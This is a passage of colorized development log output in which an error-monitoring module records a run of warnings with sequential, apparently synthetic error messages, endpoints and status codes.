WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.808230Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m46[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2258'[0m [36merror_type[0m=[35merror_type_8[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_58[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m458[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.808286Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m46[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2259'[0m [36merror_type[0m=[35merror_type_9[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_59[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m459[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.808337Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m46[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2260'[0m [36merror_type[0m=[35merror_type_10[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_60[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m460[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.808388Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m46[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2261'[0m [36merror_type[0m=[35merror_type_11[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_61[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m461[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.808438Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m46[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2262'[0m [36merror_type[0m=[35merror_type_12[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_62[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m462[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.808488Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m46[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2263'[0m [36merror_type[0m=[35merror_type_13[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_63[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m463[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.808541Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m46[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2264'[0m [36merror_type[0m=[35merror_type_14[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_64[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m464[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.808595Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m46[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2265'[0m [36merror_type[0m=[35merror_type_15[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_65[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m465[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.808646Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m46[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2266'[0m [36merror_type[0m=[35merror_type_16[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_66[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m466[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.808696Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m46[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2267'[0m [36merror_type[0m=[35merror_type_17[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_67[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m467[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.808746Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m46[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2268'[0m [36merror_type[0m=[35merror_type_18[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_68[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m468[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.808797Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m46[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2269'[0m [36merror_type[0m=[35merror_type_19[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_69[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m469[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.808846Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m46[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2270'[0m [36merror_type[0m=[35merror_type_20[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_70[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m470[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.808897Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m46[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2271'[0m [36merror_type[0m=[35merror_type_21[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_71[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m471[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.808950Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m46[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2272'[0m [36merror_type[0m=[35merror_type_22[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_72[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m472[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.809003Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m46[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2273'[0m [36merror_type[0m=[35merror_type_23[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_73[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m473[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.809054Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m46[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2274'[0m [36merror_type[0m=[35merror_type_24[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_74[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m474[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.809106Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m46[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2275'[0m [36merror_type[0m=[35merror_type_25[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_75[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m475[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.809155Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m46[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2276'[0m [36merror_type[0m=[35merror_type_26[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_76[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m476[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.809203Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m46[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2277'[0m [36merror_type[0m=[35merror_type_27[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_77[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m477[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.809251Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m46[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2278'[0m [36merror_type[0m=[35merror_type_28[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_78[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m478[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.809299Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m46[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2279'[0m [36merror_type[0m=[35merror_type_29[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_79[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m479[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.809348Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m46[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2280'[0m [36merror_type[0m=[35merror_type_30[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_80[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m480[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.809396Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m46[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2281'[0m [36merror_type[0m=[35merror_type_31[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_81[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m481[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.809444Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m46[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2282'[0m [36merror_type[0m=[35merror_type_32[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_82[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m482[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.809492Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m46[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2283'[0m [36merror_type[0m=[35merror_type_33[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_83[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m483[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.809539Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m46[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2284'[0m [36merror_type[0m=[35merror_type_34[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_84[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m484[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.809586Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m46[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2285'[0m [36merror_type[0m=[35merror_type_35[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_85[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m485[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.809634Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m46[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2286'[0m [36merror_type[0m=[35merror_type_36[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_86[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m486[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.809683Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m46[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2287'[0m [36merror_type[0m=[35merror_type_37[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_87[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m487[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.809731Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m46[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2288'[0m [36merror_type[0m=[35merror_type_38[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_88[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m488[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.809778Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m46[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2289'[0m [36merror_type[0m=[35merror_type_39[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_89[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m489[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.809825Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m46[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2290'[0m [36merror_type[0m=[35merror_type_40[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_90[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m490[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.809873Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m46[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2291'[0m [36merror_type[0m=[35merror_type_41[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_91[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m491[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.809966Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m46[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2292'[0m [36merror_type[0m=[35merror_type_42[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_92[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m492[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.810049Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m46[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2293'[0m [36merror_type[0m=[35merror_type_43[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_93[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m493[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.810109Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m46[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2294'[0m [36merror_type[0m=[35merror_type_44[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_94[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m494[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.810164Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m46[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2295'[0m [36merror_type[0m=[35merror_type_45[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_95[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m495[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.810229Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m46[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2296'[0m [36merror_type[0m=[35merror_type_46[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_96[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m496[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.810284Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m46[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2297'[0m [36merror_type[0m=[35merror_type_47[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_97[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m497[0m
